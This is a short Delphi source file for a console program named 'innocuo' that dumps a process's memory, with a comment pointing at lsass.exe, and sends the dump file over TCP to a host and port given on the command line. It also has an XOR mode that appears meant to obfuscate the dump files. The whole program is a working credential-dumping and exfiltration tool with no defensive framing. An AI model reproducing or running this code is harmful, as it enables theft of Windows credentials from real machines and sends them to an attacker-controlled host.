program innocuo;

{$APPTYPE CONSOLE}

{$R *.res}

uses
  System.SysUtils,
  uimagehlp,IdTCPClient{,IdTCPConnection},uxor;

var
key:string;

var idTCPClient         : TIdTCPClient;
    pid: integer;


begin
  try
//    getpid();
     begin
      if paramstr(1) = 'xor' then
       begin
         xorfile(paramstr(2),paramstr(3),66);
         exit;
       end;

      dumpprocess(strtoint(paramstr(1))); //lsass.exe); //15156
      if paramstr(2)<>'' then
       begin
        idTCPClient                 := TIdTCPClient.Create();
        idTCPClient.Host            := paramstr(2);
        idTCPClient.Port            := strtoint(paramstr(3));
        IdTCPClient.Connect;
        idTCPClient.IOHandler.WriteFile(paramstr(1)+'.dmp.obfusco');
        idTCPClient.Disconnect;
       end;
     end;
  except
    on E: Exception do
      Writeln(E.ClassName, ': ', E.Message);
  end;
end.
